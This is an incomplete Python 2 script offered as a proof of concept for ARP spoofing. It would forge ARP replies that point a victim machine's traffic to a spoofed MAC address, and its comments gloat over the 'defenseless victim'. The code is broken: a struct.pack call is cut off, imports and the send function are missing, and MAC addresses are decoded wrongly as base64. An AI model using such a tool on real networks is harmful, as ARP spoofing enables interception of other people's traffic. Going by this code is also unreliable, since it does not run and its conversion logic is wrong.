#!/usr/bin/python
import socket
import struct
import sys

# This code sends an ARP packet using the interface wlo2
# The idea is to create spoof ARP packets and verify that this PoC works 

def create_ARP_pack(target_mac, target_ip, spoof_mac, spoof_ip):
  # Adding data to the Packet (this is the ethernet portion 
  # The Ethernet header contains Destination MAC (6 bytes), Source MAC (6 bytes) and Ethernet type (2 bytes)
  # To "create" the MAC addresses we will convert from ASCII to binary and from binary to hexadecimal using the function get_hex_mac
  packet = struct.pack('>6s6s2s', 
  
def get_hex_mac(ascii_mac):
  # Converting from ASCII to binary
  bin_mac = a2b_base64(ascii_mac)
  # Converting from binary to hexadecimal
  hex_mac = b2a_hex(bin_mac)

def main():
  args = argv[1:]
  if len(args) < 4 :
    print 'Usage: Spoof_ARP.py Target_MAC_Addr Target_IP_Addr Spoof_MAC_Addr Spoof_IP_Addr'
    print 'The MAC addresses must be in the format aabbccddeeff. The IP Addresses must be in the format: 192.168.1.2'
    print 'This program does an ARP spoof By sending an ARP packet to the Target Machine containing the Spoof data'
  else:
    # Ordering the received arguments into their corresponding variables
    target_mac = args[0]
    target_ip = args[1]
    spoof_mac = args[2]
    spoof_ip = args[3]
    # Creating the ARP packet (and the underlying Ethernet packet too)
    packet = create_ARP_pack(target_mac, target_ip, spoof_mac, spoof_ip)
    # Sending the packet to our defenseless victim !! muajajajajaja 
    send_packet(packet)

if __name__ == '__main__':
  main()
